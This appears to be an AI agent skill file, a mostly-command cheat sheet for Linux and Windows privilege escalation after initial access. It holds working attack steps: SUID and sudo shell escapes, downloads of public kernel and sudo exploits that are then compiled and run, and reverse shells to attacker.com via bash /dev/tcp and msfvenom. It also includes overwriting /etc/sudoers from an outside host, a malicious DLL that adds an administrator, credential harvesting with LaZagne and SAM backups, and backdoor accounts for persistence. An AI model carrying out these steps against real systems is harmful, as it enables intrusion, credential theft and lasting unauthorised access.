---
name: privilege-escalation
description: Linux/Windows privesc, kernel exploits, SUID, sudo abuse.
tags: [privesc, privilege-escalation, linux, windows, kernel, suid, sudo]
---

# Privilege Escalation

Use when user requests privilege escalation techniques for Linux or Windows systems after gaining initial access.

## Trigger Conditions
- Linux privilege escalation
- Windows privilege escalation
- Kernel exploit identification
- SUID/SGID abuse
- Sudo misconfiguration exploitation
- Service exploitation
- Token manipulation (Windows)

## Linux Privilege Escalation

### Enumeration Scripts

#### LinPEAS (Recommended)
```bash
# Download and run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

# Or transfer to target
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Save output
./linpeas.sh > linpeas_output.txt
```

#### LinEnum
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

#### Linux Smart Enumeration (LSE)
```bash
wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh
chmod +x lse.sh
./lse.sh -l 2  # Level 2 (detailed)
```

### Manual Enumeration

#### System Information
```bash
# OS version
cat /etc/issue
cat /etc/*-release
uname -a

# Kernel version (check for exploits)
uname -r

# Architecture
uname -m

# Running processes
ps aux
ps -ef

# Network information
ifconfig -a
ip a
netstat -antup
ss -tunlp
```

#### User Information
```bash
# Current user
id
whoami

# All users
cat /etc/passwd

# Sudo permissions
sudo -l

# Groups
groups
cat /etc/group

# Users with shell
grep -v nologin /etc/passwd

# Recently logged in
last
lastlog
```

#### File System
```bash
# SUID files
find / -perm -4000 -type f 2>/dev/null
find / -uid 0 -perm -4000 -type f 2>/dev/null

# SGID files
find / -perm -2000 -type f 2>/dev/null

# World-writable files
find / -perm -222 -type f 2>/dev/null

# World-writable directories
find / -perm -2 -type d 2>/dev/null

# Writable /etc/passwd or /etc/shadow
ls -la /etc/passwd /etc/shadow

# Files owned by current user
find / -user $(whoami) 2>/dev/null

# Recently modified files
find / -mtime -1 2>/dev/null

# Configuration files
find / -name "*.conf" 2>/dev/null | xargs grep -i "password"
```

### SUID Exploitation

#### Common SUID Binaries
```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# GTFOBins (https://gtfobins.github.io/)
# Exploitable SUID binaries:

# nmap (old versions)
nmap --interactive
!sh

# vim
vim -c ':!/bin/bash'

# find
find . -exec /bin/bash -p \;

# less/more
less /etc/passwd
!/bin/bash

# awk
awk 'BEGIN {system("/bin/bash -p")}'

# python
python -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# perl
perl -e 'exec "/bin/bash";'

# tar
tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# cp (copy /etc/shadow to read it)
cp /etc/shadow /tmp/shadow

# wget (overwrite files as root)
wget http://attacker.com/sudoers -O /etc/sudoers
```

### Sudo Exploitation

#### Check Sudo Permissions
```bash
sudo -l

# Output examples:
# (ALL) NOPASSWD: /usr/bin/find
# (root) /usr/bin/vim
```

#### Sudo Abuse Examples
```bash
# sudo find
sudo find . -exec /bin/bash \; -quit

# sudo vim
sudo vim -c ':!/bin/bash'

# sudo less
sudo less /etc/passwd
!/bin/bash

# sudo python
sudo python -c 'import os; os.system("/bin/bash")'

# sudo awk
sudo awk 'BEGIN {system("/bin/bash")}'

# sudo tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# sudo zip
sudo zip /tmp/test.zip /tmp/test -T -TT 'sh #'

# sudo git
sudo git -p help
!/bin/bash

# sudo apache2 (read files)
sudo apache2 -f /etc/shadow

# sudo env (if SETENV allowed)
sudo env /bin/bash
```

#### Sudo Version Exploits
```bash
# CVE-2019-14287 (Sudo < 1.8.28)
# If (ALL, !root) in sudoers
sudo -u#-1 /bin/bash

# CVE-2021-3156 (Baron Samedit)
# Sudo 1.8.2-1.8.31p2, 1.9.0-1.9.5p1
wget https://github.com/blasty/CVE-2021-3156/raw/main/exploit.c
gcc exploit.c -o exploit
./exploit
```

### Writable /etc/passwd

#### Add Root User
```bash
# Check if writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt hack password123
# Output: $1$hack$...

# Add root user
echo 'hacker:$1$hack$...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login as hacker
su hacker
# Password: password123
```

### Cron Jobs Exploitation

#### Find Cron Jobs
```bash
# System cron
cat /etc/crontab
ls -la /etc/cron*

# User cron
crontab -l
ls -la /var/spool/cron/crontabs/

# Writable cron scripts
find /etc/cron* -type f -perm -o+w 2>/dev/null
```

#### Exploit Writable Cron Script
```bash
# If /usr/local/bin/backup.sh runs as root and is writable
echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /usr/local/bin/backup.sh

# Or add SUID to bash
echo "chmod +s /bin/bash" >> /usr/local/bin/backup.sh

# Wait for cron to execute
# Then:
/bin/bash -p
```

### Capabilities Exploitation

#### Find Capabilities
```bash
getcap -r / 2>/dev/null

# Common exploitable capabilities:
# cap_setuid+ep = can change UID to root
# cap_dac_read_search = can read any file
# cap_dac_override = can write any file
```

#### Exploit cap_setuid
```bash
# If python has cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# If perl has cap_setuid+ep
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### Kernel Exploits

#### Check Kernel Version
```bash
uname -r
```

#### Common Kernel Exploits
```bash
# Dirty COW (CVE-2016-5195)
# Kernel 2.6.22 - 4.8.3
wget https://github.com/firefart/dirtycow/raw/master/dirty.c
gcc -pthread dirty.c -o dirty -lcrypt
./dirty password123

# DirtyCred (CVE-2022-0847)
# Kernel 5.8 - 5.16.11
wget https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/raw/main/exploit.c
gcc exploit.c -o exploit
./exploit

# PwnKit (CVE-2021-4034)
# pkexec/polkit
wget https://github.com/ly4k/PwnKit/raw/main/PwnKit
chmod +x PwnKit
./PwnKit

# CVE-2021-4034 (another variant)
wget https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c
gcc cve-2021-4034.c -o exploit
./exploit
```

### NFS No Root Squash

#### Check NFS Exports
```bash
# On target
cat /etc/exports

# Look for: /share *(rw,no_root_squash)
```

#### Exploit
```bash
# On attacker (as root)
mkdir /tmp/nfs
mount -t nfs target.com:/share /tmp/nfs

# Create SUID shell
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash

# On target
/share/bash -p
```

### Docker Escape

#### Check if in Docker
```bash
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker
```

#### Privileged Container Escape
```bash
# If running as privileged
fdisk -l
# Note disk (e.g., /dev/sda1)

mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Now access host filesystem
chroot /mnt/host
```

## Windows Privilege Escalation

### Enumeration Scripts

#### WinPEAS
```powershell
# Download
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile winPEAS.exe

# Run
.\winPEAS.exe

# Quiet mode
.\winPEAS.exe quiet
```

#### PowerUp (PowerSploit)
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

Invoke-AllChecks
```

#### PrivescCheck
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1')

Invoke-PrivescCheck
```

### Manual Enumeration

#### System Information
```powershell
# OS version
systeminfo
wmic os get caption,version

# Hotfixes (missing patches)
wmic qfe list

# Architecture
wmic os get osarchitecture

# Installed software
wmic product get name,version

# Running processes
tasklist /v
wmic process list full

# Services
wmic service list brief
sc query

# Network
ipconfig /all
netstat -ano
route print
```

#### User Information
```powershell
# Current user
whoami
whoami /priv
whoami /groups

# All users
net user
net localgroup administrators

# Password policy
net accounts
```

### Unquoted Service Path

#### Find Vulnerable Services
```powershell
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """

# Look for paths with spaces and no quotes:
# C:\Program Files\Vulnerable Service\service.exe
```

#### Exploit
```powershell
# If service path is: C:\Program Files\Vulnerable Service\service.exe
# Create payload at: C:\Program.exe

# Payload (reverse shell)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f exe -o Program.exe

# Upload Program.exe to C:\
# Restart service
sc stop VulnerableService
sc start VulnerableService

# Or wait for reboot
```

### Weak Service Permissions

#### Check Service Permissions
```powershell
# Using accesschk (Sysinternals)
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# Check specific service
accesschk.exe /accepteula -uwcqv user VulnerableService

# Look for SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS
```

#### Exploit
```powershell
# Change service binary path
sc config VulnerableService binpath= "C:\payload.exe"

# Restart service
sc stop VulnerableService
sc start VulnerableService
```

### AlwaysInstallElevated

#### Check Registry
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both are 0x1, MSI files install as SYSTEM
```

#### Exploit
```powershell
# Create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker.com LPORT=4444 -f msi -o payload.msi

# Install
msiexec /quiet /qn /i payload.msi
```

### DLL Hijacking

#### Find Vulnerable Processes
```powershell
# Check process DLL load order
# Use Process Monitor (procmon.exe)
# Look for "NAME NOT FOUND" on DLLs in writable directories
```

#### Exploit
```c
// malicious.dll
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net localgroup administrators user /add");
    }
    return TRUE;
}

// Compile with mingw
x86_64-w64-mingw32-gcc malicious.c -shared -o malicious.dll

// Place in application directory
```

### Token Impersonation

#### Check Privileges
```powershell
whoami /priv

# Look for:
# SeImpersonatePrivilege
# SeAssignPrimaryTokenPrivilege
# SeDebugPrivilege
```

#### Exploit with Juicy Potato (Windows Server 2016 and older)
```powershell
# Download
wget https://github.com/ohpe/juicy-potato/releases/latest/download/JuicyPotato.exe

# Run
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net localgroup administrators user /add" -t *
```

#### PrintSpoofer (Windows 10/Server 2019+)
```powershell
wget https://github.com/itm4n/PrintSpoofer/releases/latest/download/PrintSpoofer64.exe

.\PrintSpoofer64.exe -i -c cmd
```

#### RoguePotato
```powershell
wget https://github.com/antonioCoco/RoguePotato/releases/latest/download/RoguePotato.exe

.\RoguePotato.exe -r attacker.com -l 9999 -e "cmd.exe"
```

### Kernel Exploits (Windows)

#### Check Windows Version
```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

#### Common Exploits
```powershell
# MS16-032 (Windows 7-10, Server 2008-2012)
wget https://github.com/EmpireProject/Empire/raw/master/data/module_source/privesc/Invoke-MS16032.ps1
powershell -ep bypass
Import-Module .\Invoke-MS16032.ps1
Invoke-MS16032

# MS17-010 (EternalBlue) - for RCE, not privesc
# Use only if needed for lateral movement

# CVE-2021-1675 (PrintNightmare)
wget https://github.com/calebstewart/CVE-2021-1675/raw/main/CVE-2021-1675.ps1
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Password123!" -DriverName "PrintIt"
```

### Stored Credentials

#### Search for Credentials
```powershell
# Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Files
dir /s *pass* == *cred* == *vnc* == *.config*

# Unattend files
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml

# SAM/SYSTEM backups
C:\Windows\repair\SAM
C:\Windows\System32\config\RegBack\SAM

# WiFi passwords
netsh wlan show profile
netsh wlan show profile <SSID> key=clear

# Saved RDP credentials
cmdkey /list

# Browser passwords
# Use tools like LaZagne
wget https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe
.\lazagne.exe all
```

### Scheduled Tasks

#### Find Scheduled Tasks
```powershell
schtasks /query /fo LIST /v
```

#### Exploit Writable Task
```powershell
# If task script is writable
echo "net localgroup administrators user /add" > C:\path\to\task.bat

# Wait for task to execute
```

## Pitfalls
- **Detection**: EDR/AV catches common exploits
- **Stability**: Kernel exploits can crash systems
- **Patches**: Modern systems have most exploits patched
- **Logging**: Privilege escalation attempts are often logged
- **Legal**: Unauthorized access is illegal

## Post-Exploitation
After gaining root/SYSTEM:
```bash
# Linux
# Add persistent backdoor user
useradd -m -s /bin/bash -G sudo backdoor
echo 'backdoor:password' | chpasswd

# Windows
# Create admin user
net user backdoor Password123! /add
net localgroup administrators backdoor /add
```

## Related Skills
- `malware-development`: Payload creation
- `network-scanning-recon`: Identify vulnerable services
- `web-exploitation`: Initial access vector
- `advanced-hacking`: Post-exploitation techniques
